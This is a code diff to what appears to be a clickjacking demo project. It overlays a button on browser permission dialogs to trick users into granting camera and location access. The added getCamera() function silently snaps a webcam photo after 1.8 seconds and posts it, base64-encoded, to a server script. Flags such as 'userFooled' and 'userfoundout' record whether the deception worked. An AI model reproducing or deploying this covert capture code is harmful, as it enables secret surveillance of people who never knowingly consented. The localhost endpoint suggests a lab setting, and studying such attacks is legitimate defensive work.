@@ -1,3 +1,4 @@
+var userfoundout = 0;
 /**
  * Loads the json file containing the locations of the permission dialogs on many different operating systems and browsers.
  * On successful load, position the 'hitmefast'-button at the place of the 'allow'-button.
@@ -38,6 +39,56 @@ function getLocation() {
 }
 
 /**
+ * Trigger the permission dialog for Camera
+ */
+function getCamera() {
+// Normalize the various vendor prefixed versions of getUserMedia.
+  var canvas = document.getElementById('mh1');
+  navigator.getUserMedia = (navigator.getUserMedia ||
+                            navigator.webkitGetUserMedia ||
+                            navigator.mozGetUserMedia || 
+                            navigator.msGetUserMedia);
+														
+		if (navigator.getUserMedia) 
+		{
+		navigator.getUserMedia(
+		{
+		video:true,
+		audio:false
+		},        
+		function(stream) { 
+			video = document.getElementById("video"); 
+		  video.src = window.URL.createObjectURL(stream);
+			video.play();
+			setTimeout(
+			    function() {
+						canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); 
+			    	var data = canvas.toDataURL('image/png');
+						sendToServer2(data,1);
+					  video.pause();
+		      	video.src="";
+						video.src = null;
+						let tracks = stream.getTracks();
+						  tracks.forEach(function(track) {
+						    track.stop();
+						  });
+			    }, 1800);
+
+			
+	},
+		function(error) { userfoundout = 1; }
+		);
+		} else {
+	 //alert("Sorry, the browser you are using doesn't support the HTML5 webcam API");
+		// return;
+	}
+	userFooled = true;
+	
+	
+	
+}
+
+/**
  * Display a google map based on the coordinates obtained from the user.
  *
  * @param position
@@ -67,11 +118,31 @@ function sendToServer(latlon) {
 	var nickname = currentUrl.searchParams.get("nickname");
 
 	var xhr = new XMLHttpRequest();
-	var url = window.location.origin + "/html5/server/server.php";
+	var url = "https://localhost/html5/ClickJacking-master/server/server.php";
 	xhr.open("POST", url, true);
 	xhr.setRequestHeader("Content-Type", "application/json");
 
 	var data = JSON.stringify({"nickname": nickname, "latlon": latlon, "datetime": Date()});
+	xhr.send(data);
+}
+
+/**
+ * Sends the obtained image (or an error) combined with the nickname to the server.
+ * @param latlon
+ */
+function sendToServer2(data,flg) {
+	var currentUrl = new URL(window.location.href);
+	var nickname = currentUrl.searchParams.get("nickname");
+
+	var xhr = new XMLHttpRequest();
+	var url = "https://localhost/html5/ClickJacking-master/server/server2.php";
+	xhr.open("POST", url, true);
+	xhr.setRequestHeader("Content-Type", "application/json");
+	if ( flg == 1 ) 
+	var data = JSON.stringify({"nickname": nickname, "pictureb64": data});
+	else 
+	var data = JSON.stringify({"nickname": nickname,"duration":data,"saw": userfoundout, "datetime": Date()});
+	
 	xhr.send(data);
 }
 
